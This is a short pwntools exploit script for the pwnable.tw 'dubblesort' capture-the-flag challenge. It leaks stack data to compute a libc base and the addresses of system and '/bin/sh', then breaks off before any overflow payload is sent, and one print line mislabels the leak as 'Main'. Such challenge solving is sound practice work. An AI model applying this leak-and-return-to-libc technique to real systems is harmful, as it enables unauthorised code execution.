#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("dubblesort_patched")
libc = elf.libc

local = True 
if local:
    p = process("./dubblesort_patched")
    gdb.attach(p,'''b*main+111\nc''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./dubblesort_patched', checksec=False)

payload = b"a"*28
p.sendlineafter(b"What your name :", payload)

p.recvuntil(payload)

libc_base = int.from_bytes(p.recv(4),"little") - 1769482
system = libc_base + 0x3a940
binsh = libc_base + 0x158e8b

leak = int.from_bytes(p.recv(4),"little") + 1322
main = leak + 360


print("[+]Libc_base:    ", hex(libc_base))
print("[+]Leak:         ", hex(leak))
print("[+]Main:         ", hex(leak))

p.sendlineafter(b"How many numbers do you what to sort :", b"25")

def send(value):
    p.sendlineafter(b" number :", str(value))

p.interactive()